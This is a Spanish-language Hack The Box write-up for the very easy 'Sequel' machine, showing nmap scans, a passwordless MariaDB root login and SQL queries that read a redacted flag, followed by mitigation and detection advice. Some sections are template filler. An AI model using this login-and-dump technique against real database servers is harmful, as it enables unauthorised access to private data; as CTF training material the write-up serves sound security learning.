---
machine: Sequel
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, mysql, no-auth, database]
---

# Sequel — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available (Starting Point), publicable.
> Ficha de referencia. Sin flags ni credenciales reales.

## TL;DR

**MariaDB/MySQL en 3306 con `root` sin contraseña**. Se conecta uno con el cliente, lista las bases de datos, entra en la del reto y lee la tabla con la flag. Otro servicio mal configurado, sin exploit.

## Reconocimiento

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
22/tcp    ssh    OpenSSH
3306/tcp  mysql  MariaDB 10.3.27
```

```bash
nmap -p3306 --script mysql-info,mysql-empty-password <IP>
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
mysql -h <IP> -u root
```

```sql
show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```sql
use htb;
show tables;
select * from config;
```

```text
+----+----------------------------------+
| id | value                            |
+----+----------------------------------+
|  1 | <flag>                           |
+----+----------------------------------+
```

Si `root` tuviera contraseña, el siguiente paso sería probar credenciales por defecto o vacías en otros usuarios y, con `FILE`, leer ficheros del sistema.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

```text
htb.config.value  ->  <flag>
```

## Lecciones aprendidas

- Un motor de base de datos expuesto con `root` sin contraseña es lectura total del servidor de datos.
- `bind-address = 0.0.0.0` en 3306 saca la base de datos a la red sin necesidad de vulnerabilidad.
- Mitigación: `bind-address = 127.0.0.1`, `root@localhost` con contraseña fuerte, usuarios por aplicación y firewall.
- Detección: conexiones al 3306 desde fuera del segmento de aplicación y logins correctos con `root` desde IPs nuevas.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- Documentación de la plataforma y del servicio afectado.
